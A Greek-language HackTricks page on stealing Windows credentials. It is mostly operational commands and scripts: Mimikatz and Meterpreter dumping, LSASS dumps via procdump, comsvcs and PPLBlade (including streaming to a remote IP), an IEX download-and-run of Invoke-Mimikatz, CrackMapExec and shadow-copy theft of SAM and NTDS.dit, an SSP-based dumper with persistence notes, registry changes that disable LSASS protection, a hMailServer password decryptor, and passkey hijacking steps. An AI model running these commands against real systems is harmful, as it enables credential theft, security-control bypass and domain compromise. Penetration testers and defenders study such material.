# Κλοπή διαπιστευτηρίων Windows

{{#include ../../banners/hacktricks-training.md}}

## Διαπιστευτήρια Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz σε** [**αυτή τη σελίδα**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Μάθετε για ορισμένες πιθανές προστασίες credentials εδώ.**](credentials-protections.md) **Αυτές οι προστασίες θα μπορούσαν να εμποδίσουν το Mimikatz να εξαγάγει ορισμένα credentials.**

## Credentials με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε passwords και hashes** μέσα στο θύμα.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Παράκαμψη του AV

### Procdump + Mimikatz

Καθώς το **Procdump από το** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν ανιχνεύεται από το Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **κάνετε dump τη διεργασία lsass**, να **κατεβάσετε το dump** και να **εξαγάγετε** τα **διαπιστευτήρια τοπικά** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε το [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Αυτή η διαδικασία εκτελείται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Ορισμένα **AV** ενδέχεται να **ανιχνεύσουν** ως **κακόβουλη** τη χρήση του **procdump.exe για dump του lsass.exe**, επειδή **ανιχνεύουν** τις συμβολοσειρές **"procdump.exe" και "lsass.exe"**. Επομένως, είναι πιο **stealthier** να δοθεί ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί** για το **όνομα lsass.exe.**

### Dumping lsass με **comsvcs.dll**

Ένα DLL με το όνομα **comsvcs.dll**, που βρίσκεται στο `C:\Windows\System32`, είναι υπεύθυνο για το **dump της μνήμης μιας διεργασίας** σε περίπτωση crash. Αυτό το DLL περιλαμβάνει μια **function** με το όνομα **`MiniDumpW`**, η οποία έχει σχεδιαστεί να καλείται μέσω του `rundll32.exe`.\
Η χρήση των δύο πρώτων ορισμάτων δεν είναι σχετική, αλλά το τρίτο διαιρείται σε τρία στοιχεία. Το process ID που θα γίνει dump αποτελεί το πρώτο στοιχείο, η τοποθεσία του αρχείου dump αντιπροσωπεύει το δεύτερο και το τρίτο στοιχείο είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Μετά την ανάλυση αυτών των τριών στοιχείων, το DLL χρησιμοποιείται για τη δημιουργία του αρχείου dump και τη μεταφορά της μνήμης της指定ς διεργασίας σε αυτό το αρχείο.\
Η χρήση του **comsvcs.dll** είναι εφικτή για το dump της διεργασίας lsass, εξαλείφοντας έτσι την ανάγκη για upload και εκτέλεση του procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στη διεύθυνση [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Η ακόλουθη εντολή χρησιμοποιείται για την εκτέλεση:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Μπορείτε να αυτοματοποιήσετε αυτήν τη διαδικασία με το** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass με Task Manager**

1. Κάντε δεξί κλικ στη γραμμή εργασιών και κάντε κλικ στο Task Manager
2. Κάντε κλικ στο More details
3. Αναζητήστε τη διεργασία "Local Security Authority Process" στην καρτέλα Processes
4. Κάντε δεξί κλικ στη διεργασία "Local Security Authority Process" και κάντε κλικ στο "Create dump file".

### Dumping lsass με procdump

Το [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα binary υπογεγραμμένο από τη Microsoft, το οποίο αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping lsass με PPLBlade

Το [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα Protected Process Dumper Tool που υποστηρίζει την απόκρυψη του memory dump και τη μεταφορά του σε απομακρυσμένους σταθμούς εργασίας χωρίς την αποθήκευσή του στον δίσκο.

**Βασικές λειτουργίες**:

1. Παράκαμψη της προστασίας PPL
2. Απόκρυψη των αρχείων memory dump για την αποφυγή των μηχανισμών ανίχνευσης του Defender που βασίζονται σε signatures
3. Upload του memory dump με μεθόδους RAW και SMB, χωρίς την αποθήκευσή του στον δίσκο (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based dumping του LSASS χωρίς MiniDumpWriteDump

Το Ink Dragon διαθέτει έναν dumper τριών σταδίων με την ονομασία **LalsDumper**, ο οποίος δεν καλεί ποτέ το `MiniDumpWriteDump`, επομένως τα EDR hooks σε αυτό το API δεν ενεργοποιούνται:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – αναζητά στο `fdp.dll` ένα placeholder που αποτελείται από 32 πεζούς χαρακτήρες `d`, το αντικαθιστά με το absolute path προς το `rtu.txt`, αποθηκεύει το patched DLL ως `nfdp.dll` και καλεί `AddSecurityPackageA("nfdp","fdp")`. Αυτό αναγκάζει το **LSASS** να φορτώσει το malicious DLL ως νέο Security Support Provider (SSP).
2. **Stage 2 μέσα στο LSASS** – όταν το LSASS φορτώνει το `nfdp.dll`, το DLL διαβάζει το `rtu.txt`, εφαρμόζει XOR σε κάθε byte με `0x20` και κάνει map το decoded blob στη μνήμη πριν μεταφέρει την εκτέλεση.
3. **Stage 3 dumper** – το mapped payload επανυλοποιεί τη λογική του MiniDump χρησιμοποιώντας **direct syscalls**, τα οποία επιλύονται από hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ένα ειδικό export με το όνομα `Tom` ανοίγει το `%TEMP%\<pid>.ddt`, κάνει stream ένα compressed LSASS dump στο αρχείο και κλείνει το handle, ώστε το exfiltration να γίνει αργότερα.

Σημειώσεις για τον operator:

* Διατήρησε τα `lals.exe`, `fdp.dll`, `nfdp.dll` και `rtu.txt` στον ίδιο κατάλογο. Το Stage 1 αντικαθιστά το hard-coded placeholder με το absolute path προς το `rtu.txt`, επομένως ο διαχωρισμός τους διακόπτει την αλυσίδα.
* Η registration γίνεται με την προσθήκη του `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείς να κάνεις seed αυτή την τιμή, ώστε το LSASS να κάνει reload το SSP σε κάθε boot.
* Τα `%TEMP%\*.ddt` αρχεία είναι compressed dumps. Κάνε decompress locally και έπειτα τροφοδότησέ τα στα Mimikatz/Volatility για credential extraction.
* Η εκτέλεση του `lals.exe` απαιτεί admin/SeTcb rights ώστε να επιτύχει το `AddSecurityPackageA`. Μόλις ολοκληρωθεί η κλήση, το LSASS φορτώνει transparently το rogue SSP και εκτελεί το Stage 2.
* Η αφαίρεση του DLL από τον δίσκο δεν το εκτοπίζει από το LSASS. Είτε διέγραψε το registry entry και κάνε restart το LSASS (reboot), είτε άφησέ το για long-term persistence.

## CrackMapExec

### Dump των SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump του NTDS.dit από το target DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump του ιστορικού κωδικών πρόσβασης του NTDS.dit από το target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Εμφάνιση του attribute pwdLastSet για κάθε λογαριασμό NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Αυτά τα αρχεία θα πρέπει να **βρίσκονται** στα _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Ωστόσο, **δεν μπορείτε απλώς να τα αντιγράψετε με τον κανονικό τρόπο**, επειδή προστατεύονται.

### Από το Registry

Ο ευκολότερος τρόπος για να κλέψετε αυτά τα αρχεία είναι να λάβετε ένα αντίγραφό τους από το Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Κατεβάστε** αυτά τα αρχεία στο μηχάνημά σας με Kali και **εξαγάγετε τα hashes** χρησιμοποιώντας:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτήν την υπηρεσία. Χρειάζεται να είστε Administrator.

#### Χρήση του vssadmin

Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο σε εκδόσεις Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Αλλά μπορείς να κάνεις το ίδιο από το **Powershell**. Αυτό είναι ένα παράδειγμα για το **πώς να αντιγράψεις το αρχείο SAM** (ο σκληρός δίσκος που χρησιμοποιείται είναι ο "C:" και το αρχείο αποθηκεύεται στο C:\users\Public), αλλά μπορείς να το χρησιμοποιήσεις για την αντιγραφή οποιουδήποτε προστατευμένου αρχείου:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Τέλος, θα μπορούσες επίσης να χρησιμοποιήσεις το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσεις ένα αντίγραφο των SAM, SYSTEM και ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Διαπιστευτήρια Active Directory - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory**, καθώς περιέχει κρίσιμα δεδομένα σχετικά με αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Εκεί αποθηκεύονται τα **password hashes** των χρηστών του domain. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στη διαδρομή **_%SystemRoom%/NTDS/ntds.dit_**.

Μέσα σε αυτήν τη βάση δεδομένων διατηρούνται τρεις κύριοι πίνακες:

- **Data Table**: Αυτός ο πίνακας είναι υπεύθυνος για την αποθήκευση πληροφοριών σχετικά με αντικείμενα, όπως χρήστες και ομάδες.
- **Link Table**: Καταγράφει τις σχέσεις, όπως τις συμμετοχές σε ομάδες.
- **SD Table**: Εδώ αποθηκεύονται οι **security descriptors** για κάθε αντικείμενο, διασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης των αποθηκευμένων αντικειμένων.

Περισσότερες πληροφορίες σχετικά με αυτό: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο, και αυτό χρησιμοποιείται από το _lsass.exe_. Επομένως, **μέρος** του αρχείου **NTDS.dit** μπορεί να βρίσκεται στη μνήμη του **`lsass`** (πιθανότατα μπορείτε να βρείτε τα πιο πρόσφατα δεδομένα στα οποία έγινε πρόσβαση, λόγω της βελτίωσης της απόδοσης μέσω χρήσης μιας **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash είναι κρυπτογραφημένο 3 φορές:

1. Αποκρυπτογράφηση του Password Encryption Key (**PEK**) με χρήση του **BOOTKEY** και του **RC4**.
2. Αποκρυπτογράφηση του **hash** με χρήση του **PEK** και του **RC4**.
3. Αποκρυπτογράφηση του **hash** με χρήση του **DES**.

Το **PEK** έχει την **ίδια τιμή** σε **κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο αρχείο **NTDS.dit** με χρήση του **BOOTKEY** του **SYSTEM file του domain controller (διαφέρει μεταξύ των domain controllers)**. Για αυτό, προκειμένου να λάβετε τα credentials από το αρχείο NTDS.dit, **χρειάζεστε τα αρχεία NTDS.dit και SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Αντιγραφή του NTDS.dit με χρήση του Ntdsutil

Διαθέσιμο από το Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Μπορείτε επίσης να χρησιμοποιήσετε το trick του [**volume shadow copy**](#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του αρχείου **SYSTEM** (ξανά, χρησιμοποιήστε το trick [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Εξαγωγή hashes από το NTDS.dit**

Μόλις **αποκτήσετε** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξαγάγετε τα hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Μπορείτε επίσης να **τα εξαγάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Για **μεγάλα αρχεία NTDS.dit**, συνιστάται η εξαγωγή τους με το [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων domain από το NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Δεν εξάγονται μόνο τα secrets, αλλά και ολόκληρα τα αντικείμενα μαζί με τα attributes τους, για περαιτέρω εξαγωγή πληροφοριών, όταν το raw αρχείο NTDS.dit έχει ήδη ανακτηθεί.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Το `SYSTEM` hive είναι προαιρετικό, αλλά επιτρέπει την αποκρυπτογράφηση secrets (NT & LM hashes, supplemental credentials όπως cleartext passwords, kerberos ή trust keys, NT & LM password histories). Μαζί με άλλες πληροφορίες, εξάγονται τα ακόλουθα δεδομένα: user και machine accounts με τα hashes τους, UAC flags, timestamp για το τελευταίο logon και την αλλαγή password, περιγραφή accounts, names, UPN, SPN, groups και recursive memberships, organizational units tree και membership, trusted domains με τον τύπο, την κατεύθυνση και τα attributes των trusts...

## Lazagne

Κατεβάστε το binary από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για την εξαγωγή credentials από διάφορα software.
```
lazagne.exe all
```
## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από τα SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Κατεβάστε το από:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλώς **εκτελέστε το** ώστε να εξαχθούν οι κωδικοί πρόσβασης.

## Συλλογή idle RDP sessions και αποδυνάμωση των security controls

Το FinalDraft RAT της Ink Dragon περιλαμβάνει ένα tasker `DumpRDPHistory`, οι τεχνικές του οποίου είναι χρήσιμες για κάθε red-teamer:<sup>[[3]](#references)</sup>

### Συλλογή telemetry τύπου DumpRDPHistory

* **Outbound RDP targets** – αναλύστε κάθε user hive στο `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε subkey αποθηκεύει το όνομα του server, το `UsernameHint` και το timestamp της τελευταίας εγγραφής. Μπορείτε να αναπαραγάγετε τη λογική του FinalDraft με PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – αναζητήστε στο log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` τα Event IDs **21** (επιτυχές logon) και **25** (disconnect), ώστε να χαρτογραφήσετε ποιος διαχειρίστηκε το box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Μόλις γνωρίζετε ποιος Domain Admin συνδέεται τακτικά, κάντε dump το LSASS (με LalsDumper/Mimikatz) όσο το **disconnected** session του εξακολουθεί να υπάρχει. Το CredSSP + NTLM fallback αφήνει το verifier και τα tokens του στο LSASS, τα οποία μπορούν στη συνέχεια να γίνουν replay μέσω SMB/WinRM για να κάνετε grab το `NTDS.dit` ή να εγκαταστήσετε persistence σε domain controllers.

### Registry downgrades που στοχεύει το FinalDraft

Το ίδιο implant τροποποιεί επίσης αρκετά registry keys, ώστε να διευκολύνει το credential theft:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Η ρύθμιση `DisableRestrictedAdmin=1` επιβάλλει πλήρη επαναχρησιμοποίηση διαπιστευτηρίων/ticket κατά τη διάρκεια του RDP, επιτρέποντας pivots τύπου pass-the-hash.
* Η ρύθμιση `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το UAC token filtering, ώστε οι local admins να αποκτούν unrestricted tokens μέσω του δικτύου.
* Η ρύθμιση `DSRMAdminLogonBehavior=2` επιτρέπει στον DSRM administrator να συνδεθεί ενώ ο DC είναι online, παρέχοντας στους attackers έναν ακόμη ενσωματωμένο λογαριασμό υψηλών privileges.
* Η ρύθμιση `RunAsPPL=0` καταργεί τις LSASS PPL protections, καθιστώντας την πρόσβαση στη μνήμη εύκολη για dumpers όπως το LalsDumper.

## hMailServer database credentials (post-compromise)

Το hMailServer αποθηκεύει το DB password του στο `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` κάτω από το `[Database] Password=`. Η τιμή είναι κρυπτογραφημένη με Blowfish, χρησιμοποιώντας το static key `THIS_KEY_IS_NOT_SECRET` και swaps endianness σε word των 4 byte. Χρησιμοποιήστε το hex string από το INI με αυτό το Python snippet:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Με τον κωδικό πρόσβασης σε μορφή απλού κειμένου, αντιγράψτε τη βάση δεδομένων SQL CE για να αποφύγετε τα file locks, φορτώστε τον 32-bit provider και εκτελέστε upgrade αν χρειάζεται πριν από την αναζήτηση των hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Η στήλη `accountpassword` χρησιμοποιεί τη μορφή hash του hMailServer (λειτουργία hashcat `1421`). Το cracking αυτών των τιμών μπορεί να παρέχει επαναχρησιμοποιήσιμα credentials για pivots μέσω WinRM/SSH.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Ορισμένα εργαλεία καταγράφουν **κωδικούς πρόσβασης plaintext κατά το logon** παρεμβαίνοντας στο LSA logon callback `LsaApLogonUserEx2`. Η ιδέα είναι να γίνει hook ή wrap στο callback του authentication package, ώστε τα credentials να καταγράφονται **κατά το logon** (πριν από το hashing) και στη συνέχεια να εγγράφονται στον δίσκο ή να επιστρέφονται στον operator. Αυτό συνήθως υλοποιείται ως helper που κάνει inject στο LSA ή εγγράφεται σε αυτό και, στη συνέχεια, καταγράφει κάθε επιτυχημένο interactive/network logon event μαζί με το username, το domain και το password.<sup>[[1]](#references)</sup>

Operational notes:
- Απαιτούνται local admin/SYSTEM δικαιώματα για τη φόρτωση του helper στη διαδρομή authentication.
- Τα captured credentials εμφανίζονται μόνο όταν πραγματοποιηθεί logon (interactive, RDP, service ή network logon, ανάλογα με το hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

Το SQL Server Management Studio (SSMS) αποθηκεύει τις πληροφορίες αποθηκευμένων συνδέσεων σε ένα αρχείο `sqlstudio.bin` ανά χρήστη. Dedicated dumpers μπορούν να κάνουν parse στο αρχείο και να ανακτήσουν αποθηκευμένα SQL credentials. Σε shells που επιστρέφουν μόνο την έξοδο εντολών, το αρχείο συχνά γίνεται exfiltrate με κωδικοποίησή του ως Base64 και την εκτύπωσή του στο stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Στην πλευρά του operator, ανακατασκευάστε το αρχείο και εκτελέστε το dumper τοπικά για να ανακτήσετε διαπιστευτήρια:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Κλοπή διαπιστευτηρίων Passkeys / WebAuthn από το Chrome στα Windows

Αν επιτευχθεί **εκτέλεση κώδικα** ως ο **χρήστης-θύμα** σε έναν υπολογιστή Windows που χρησιμοποιεί **Chrome + συγχρονισμένα passkeys του Google Password Manager**, τα passkeys γίνονται ένας ενδιαφέρων στόχος post-exploitation ακόμη και **χωρίς δικαιώματα admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Ενδιαφέροντα τοπικά artifacts
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** αποθηκεύει εγγραφές **`WebauthnCredentialSpecifics`** κωδικοποιημένες με protobuf. Μια διεργασία του ίδιου χρήστη μπορεί να απαριθμήσει το **RP ID**, το **username**, το **credential ID** και το κρυπτογραφημένο υλικό ιδιωτικού κλειδιού για συγχρονισμένα passkeys.<sup>[[5]](#references)</sup>
- Το **`passkey_enclave_state`** αποθηκεύει την κατάσταση εγγραφής της τοπικής συσκευής, όπως το **`wrapped_identity_private_key`** και το wrapped secret που χρησιμοποιείται για την ανάκτηση συγχρονισμένων διαπιστευτηρίων.<sup>[[4]](#references)</sup>

Γρήγορη αρχική αξιολόγηση:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Τα TPM-bound key blobs μπορούν ακόμα να καταχραστούν ως τοπικό signing oracle

Αν ο browser εξάγει ένα TPM-backed identity key ως **`NCRYPT_OPAQUE_KEY_BLOB`** και αποθηκεύει αυτό το blob σε user-accessible state, το malware **δεν** χρειάζεται να εξαγάγει το raw private key. Μπορεί απλώς να κάνει re-import το blob στο **ίδιο μηχάνημα** και να ζητήσει από το τοπικό TPM να κάνει sign σε δεδομένα που ελέγχει ο attacker:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Αυτό σημαίνει ότι το **hardware binding αποτρέπει την εξαγωγή εκτός συσκευής, αλλά όχι τη χρήση από τον ίδιο χρήστη στο compromised endpoint**.

### Practical abuse paths

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Enumerate τα `WebauthnCredentialSpecifics` από το Chrome's LevelDB.
- Ξεκινήστε ένα passkey login και λάβετε ένα νέο WebAuthn challenge.
- Χρησιμοποιήστε το κλεμμένο blob `wrapped_identity_private_key` στο TPM του victim για να υπογράψετε το cloud-authenticator request binding.
- Κάντε relay το assertion που επιστράφηκε προς το relying party.
- Αυτό είναι ιδιαίτερα χρήσιμο όταν το RP αποδέχεται `userVerification=preferred` ή αποτυγχάνει να απορρίψει assertions με **`UV=0`**.

2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Εξαναγκάστε re-onboarding διαγράφοντας το `passkey_enclave_state` ή στέλνοντας ένα έγκυρα υπογεγραμμένο `device/forget` operation.
- Αν το onboarding αφήσει τη συσκευή σε κατάσταση **`uv_key_pending`**, καταχωρίστε ένα UV public key ελεγχόμενο από τον attacker.
